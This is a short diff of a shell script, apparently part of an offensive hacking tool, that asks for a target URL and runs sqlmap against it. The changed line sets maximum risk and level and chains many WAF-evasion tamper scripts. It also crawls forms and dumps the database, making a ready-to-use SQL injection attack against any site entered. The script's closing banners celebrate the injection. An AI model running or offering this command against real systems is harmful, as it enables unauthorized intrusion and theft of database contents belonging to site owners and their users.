@@ -3,7 +3,7 @@ sleep 0.5
 toilet -f mono12 -F metal by SaintDruG 
 echo "Enter Target URL with Parameter:" | lolcat
 read URL
-sqlmap -u $URL --risk=3 --level=5 --dbs --random-agent --batch
+sqlmap -u $URL --risk=3 --level=5 --random-agent --technique=B --batch --threads=10 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mysql --forms --dump -v 3
 echo "Injection Complete GL Bro, Try Harder!" | lolcat
 sleep 0.5
 echo "COPYRIGHTS ALL RIGHTS RESERVED - BLACK HAT ETHICAL HACKING" | lolcat
